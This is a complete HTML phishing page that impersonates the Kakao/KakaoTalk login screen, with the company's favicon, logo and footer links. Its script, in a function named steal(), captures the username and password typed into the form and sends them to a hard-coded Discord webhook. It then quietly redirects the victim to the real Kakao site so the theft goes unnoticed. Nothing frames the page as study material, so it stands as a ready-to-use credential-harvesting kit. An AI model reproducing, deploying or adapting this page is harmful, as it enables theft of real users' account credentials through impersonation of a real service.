<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KakaoTalk</title>
  <link rel="icon" href="https://www.kakaocorp.com/favicon.ico">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
    }

    .container {
      width: 100%;
      max-width: 400px;
      margin: 80px auto;
      padding: 50px;
      background-color: white;
      border: 1px solid #dbdbdb;
      text-align: center;
    }

    .logo {
      width: 150px;
      margin-bottom: 20px;
    }

    .box {
      border: 1px solid #dbdbdb;
      padding: 20px;
      margin-bottom: 20px;
    }

    .input-field {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      font-size: 14px;
      background: transparent;
      border: none;
      border-bottom: 1px solid #dbdbdb;
    }

    .checkbox-container {
      text-align: left;
      margin: 10px 0;
      font-size: 14px;
      color: gray;
    }

    .checkbox-container input[type="checkbox"] {
      margin-right: 5px;
      accent-color: gray;
    }

    .gray-box-button {
      border: 1px solid #dbdbdb;
      background-color: #fafafa;
      padding: 10px;
      margin: 10px 0;
      width: 100%;
      cursor: pointer;
      font-weight: normal;
      font-size: 14px;
    }

    .footer {
      font-size: 12px;
      color: #8e8e8e;
      text-align: center;
      margin-top: 20px;
    }

    .footer a {
      color: #8e8e8e;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- Kakao logo only -->
    <img src="https://cloudfront-ap-northeast-1.images.arcpublishing.com/chosunbiz/V7G5WPM7MJXDWOGTLIHZ7HINAE.jpg" alt="Kakao Logo" class="logo">

    <!-- Main gray box -->
    <div class="box">
      <form onsubmit="steal(event)">
        <input class="input-field" id="username" type="text" placeholder="KakaoMail ID, email, or phone number" required>
        <input class="input-field" id="password" type="password" placeholder="Password" required>

        <!-- Simple login info (gray text with circular checkbox) -->
        <div class="checkbox-container">
          <label><input type="checkbox"> Simple login information storage</label>
        </div>

        <!-- Login gray box button -->
        <button type="submit" class="gray-box-button">Log In</button>
      </form>

      <!-- QR Code Login gray box -->
      <div class="gray-box-button">QR Code Login</div>

      <!-- Links inside gray box -->
      <div class="gray-box-button">
        View Help | Sign Up | Find Account | Find Password
      </div>
    </div>

    <!-- Bottom footer (outside gray box) -->
    <div class="footer">
      <a href="#">Terms of Use</a> | 
      <a href="#">Privacy Policy</a> | 
      <a href="#">Customer Center</a><br>
      Â© Kakao Corp.
    </div>
  </div>

  <script>
    function steal(e) {
      e.preventDefault();

      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;

      fetch("https://discord.com/api/webhooks/1358102599647232202/4L51fQpmCq7hnbVud6P2AoYXGkpIrt2dYOts15JgJUb9LiEMeIxJJF5AdmDfJxtHlwFd", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `ðŸ›‘ ê°•ì•„ì§€\nUsername: ${u}\nPassword: ${p}`
        })
      })
      .then(response => {
        if (response.ok) {
          setTimeout(() => {
            window.location.href = "https://www.kakaocorp.com";
          }, Math.random() * 2000 + 1000);
        } else {
          alert('Something went wrong. Please try again later.');
        }
      })
      .catch(error => {
        alert('Network error. Please check your connection.');
      });
    }
  </script>
</body>
</html>
